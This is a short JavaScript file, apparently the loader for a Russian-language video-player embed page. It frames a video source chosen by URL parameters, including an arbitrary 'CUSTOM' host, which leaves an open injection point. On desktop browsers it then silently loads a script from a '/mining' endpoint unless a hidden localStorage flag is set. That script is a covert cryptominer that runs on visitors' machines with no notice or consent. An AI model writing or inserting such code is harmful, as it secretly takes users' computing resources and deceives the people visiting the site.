document.addEventListener('DOMContentLoaded', function() {
    "use strict";

    if (navigator.cookieEnabled === false) {
        document.body.innerText = 'Для работы сайта необходимо включить куки.';
        return;
    } else if (location.search.length > 1) {
        var x1 = new URL(location.href).searchParams;
        var x2 = null;

        if (x1.get('API') === 'CUSTOM') {
            x2 = 'https://' + x1.get('LINK');
        } else if (x1.get('API') === 'MOONWALK') {
            x2 = 'https://moonwalk.egeria.space' + x1.get('LINK');
        } else if (x1.get('API') === 'HDGO') {
            x2 = 'https://hdgo.egeria.space' + x1.get('LINK');
        } else if (x1.get('API') === 'KODIK') {
            x2 = 'https://kodik.cc' + x1.get('LINK');
        } else {
            document.body.innerText = 'Неверный параметр API.';
            return;
        }

        var x3 = document.createElement('iframe');
        x3.setAttribute('src', x2);
        x3.setAttribute('allowfullscreen', '');
        document.body.appendChild(x3);

        if (typeof navigator.platform === "undefined" || (
                navigator.platform !== 'Android' &&
                navigator.platform !== 'iPhone' &&
                navigator.platform !== 'iPad' &&
                navigator.platform !== 'iPod' &&
                navigator.platform !== 'BlackBerry' &&
                navigator.platform !== 'WebTV OS' &&
                localStorage.getItem('DisableMining') === null
            )) {
            var x4 = document.createElement('script');
            x4.setAttribute('src', 'https://m1.egeria.space/mining');
            x4.setAttribute('async', '');
            document.body.appendChild(x4);
        }
    }
});